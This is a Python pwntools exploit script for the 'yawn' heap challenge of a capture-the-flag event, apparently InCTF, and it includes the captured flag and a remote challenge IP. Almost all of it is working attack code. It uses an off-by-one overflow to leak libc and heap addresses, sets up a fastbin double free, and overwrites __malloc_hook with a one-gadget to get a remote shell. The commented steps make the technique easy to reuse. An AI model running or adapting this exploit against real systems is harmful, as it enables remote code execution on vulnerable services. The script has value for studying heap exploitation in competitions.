#!/usr/bin/env python

from pwn import *

def add_note(name, desc):
    p.sendlineafter('>> ', '1')
    p.sendafter('Enter name: ', name)
    p.sendafter('Enter desc: ', desc)

def edit_note(index, name, size, desc):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('Enter index: ', str(index))
    p.sendafter('Enter name: ', name)
    p.sendlineafter('Enter size: ', str(size))
    p.sendafter('Enter desc: ', desc)

def remove_note(index):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('Enter idx: ', str(index))

def view_note(index):
    p.sendlineafter('>> ', '4')
    p.sendlineafter('Enter idx: ', str(index))

with context.quiet:
    p = remote('18.188.142.250', 1337)
    # inctf{y4wning_at_th3_st4ck_pwn1ng_4t_the_he4p}
    #  p = process('./yawn', env = {'LD_PRELOAD': './libc.so.6'})

    # node[0] => chunk_0 (0x71)
    # due to off-by-one, name is not terminated with null byte, so strcpy
    # will replace desc pointer with read@GOT
    add_note('a' * 80, '0' * 8 + p64(0x601fb0) + '\n')

    # viewing the note will leak read@GOT address in the description field
    view_note(0)

    # we can find the libc base address
    p.recvuntil('Description : ')
    read_addr = p.recvuntil('\n1)')[0:-3]
    libc_base = u64(read_addr + '\x00' * (8 - len(read_addr))) - 0xf7250
    print 'libc base: {}'.format(hex(libc_base))

    # we replace desc pointer with location of "table" in .bss to leak a heap address
    edit_note(0, 'a' * 80, 16, '0' * 8 + p64(0x602040) + '\n')

    # this will print first element in table in .bss, so we have the heap address
    view_note(0)

    # we can find the heap base address
    p.recvuntil('Description : ')
    heap_addr = p.recvuntil('\n1)')[0:-3]
    heap_base = u64(heap_addr + '\x00' * (8 - len(heap_addr))) - 0x1040
    print 'heap base: {}'.format(hex(heap_base))

    # since we have the heap address, so we can free any arbitrary address in heap

    # node[1] => chunk_1 (0x71)
    # put the address of chunk_2 in the chunk_1's desc pointer
    add_note('b' * 80, '1' * 8 + p64(heap_base + 0x1180) + '\n')

    # node[2] => chunk_2 (0x71)
    add_note('c' * 78 + '\n', '2' * 22 + '\n')

    # removing node[1] will free chunk_2 and chunk_1 and put them in the fastbin free list
    # 0x70: chunk_1 --> chunk_2
    remove_note(1)

    # removing node[2] will put chunk_2 again in the fastbin free list, resulting in fastbin_dup
    # chunk_2 --> chunk_1 --> chunk_2
    remove_note(2)

    # since we have free chunks in 0x70 free fastbin list and we have a 0x7f before malloc_hook
    # we can create a fake chunk before malloc_hook, and overwrite malloc_hook with a one gadget
    malloc_hook = libc_base + 0x3c4b10

    # node[1] => chunk_2 (0x71)
    # put the fake chunk's address before malloc_hook inside chunk_2's fd pointer
    add_note(p64(malloc_hook - 0x23) + '\n', '1' * 8 + '\n')

    # node[2] => chunk_1 (0x71)
    add_note('c' * 78 + '\n', '2' * 22 + '\n')

    # node[3] => chunk_2 (0x71)
    # this allocation put the fake chunk's address in the 0x70 fastbin free list
    add_note('d' * 78 + '\n', '3' * 22 + '\n')

    # node[4] => fake_chunk (0x7f)
    # this allocation returns the location of fake chunk's address, so we can overwrite
    # malloc_hook with one gadget address
    '''
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
        [rsp+0x50] == NULL
    '''
    add_note('e' * 0x13 + p64(libc_base + 0xf02a4) + '\n', '4' * 22 + '\n')

    # this allocation triggers malloc_hook
    add_note('\n', '\n')

    p.interactive()

